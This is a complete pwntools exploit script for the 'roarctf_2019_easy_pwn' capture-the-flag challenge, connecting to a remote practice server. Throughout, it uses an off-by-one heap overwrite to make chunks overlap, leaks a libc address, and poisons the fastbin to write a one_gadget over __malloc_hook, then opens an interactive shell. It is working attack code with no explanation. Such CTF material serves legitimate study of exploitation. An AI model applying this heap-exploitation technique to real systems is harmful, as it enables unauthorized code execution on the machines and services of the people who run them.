from pwn import *

#context.log_level = 'debug'

#p = process('./roarctf_2019_easy_pwn')
p = remote('node4.buuoj.cn', 27595)
libc = ELF('libc-2.23.buu.so')

one_gadget = 0x4526a #0x4525a

def alloc(size):
	p.sendlineafter(b'choice: ', b'1')
	p.sendlineafter(b'size: ', str(size).encode())

def edit(index, size, content):
	p.sendlineafter(b'choice: ', b'2')
	p.sendlineafter(b'index: ', str(index).encode())
	p.sendlineafter(b'size: ', str(size).encode())
	p.sendafter(b'content: ', content)

def delete(index):
	p.sendlineafter(b'choice: ', b'3')
	p.sendlineafter(b'index: ', str(index).encode())

def show(index):
	p.sendlineafter(b'choice: ', b'4')
	p.sendlineafter(b'index: ', str(index).encode())
	
alloc(0x18) #0
alloc(0x18) #1
alloc(0x88) #2
alloc(0x88) #3

edit(0, 0x18 + 10, b'a' * 0x18 + b'\xb1')
delete(1)
alloc(0xa8) #1
edit(1, 0x20, b'a' * 0x18 + p64(0x91))
delete(2)

#gdb.attach(p)
show(1)
p.recv(0x20 + 9)
malloc_hook = u64(p.recv(8)) - 0x58 - 0x10
libc_base = malloc_hook - libc.sym['__malloc_hook']
realloc = libc_base + libc.symbols['__libc_realloc']
one_gadget = one_gadget + libc_base

print('[+] malloc_hook -> {}'.format(hex(malloc_hook)))
print('[+] libc_base -> {}'.format(hex(libc_base)))
print('[+] one_gadget -> {}'.format(hex(one_gadget)))

alloc(0x88) #2

alloc(0x28) #4
alloc(0x28) #5
alloc(0x68) #6

edit(4, 0x28 + 10, b'a' * 0x28 + b'\xa1')
delete(5)
alloc(0x98) #5
edit(5, 0x38, b'a' * 0x28 + p64(0x71) + p64(malloc_hook - 0x23))
delete(6)
edit(5, 0x38, b'a' * 0x28 + p64(0x71) + p64(malloc_hook - 0x23))
alloc(0x68) #6
alloc(0x5f) #7 feak_chunk
#gdb.attach(p, 'b *$rebase(0xccc)')

edit(7, 0x10 + 0x10 - 5, b'a' * (0x10 - 5) + p64(one_gadget) + p64(realloc))

#pause()
alloc(0x10)

p.interactive()

p.recv()
pause()
